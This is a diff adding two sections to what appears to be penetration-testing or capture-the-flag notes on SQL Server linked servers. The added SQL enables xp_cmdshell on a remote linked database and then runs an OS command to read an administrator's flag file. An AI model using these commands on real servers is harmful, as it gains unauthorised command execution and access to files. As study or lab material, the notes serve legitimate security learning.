@@ -260,3 +260,17 @@ GO
 If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
 ```
 
+---
+
+**To enable xp_cmdshell on remote linked database:**
+
+```sql
+EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LINKED_DB_NAME] GO
+```
+
+**To execute commands on the remote linked database:**
+
+```sql
+EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [DATABASE_NAME] GO
+```
+
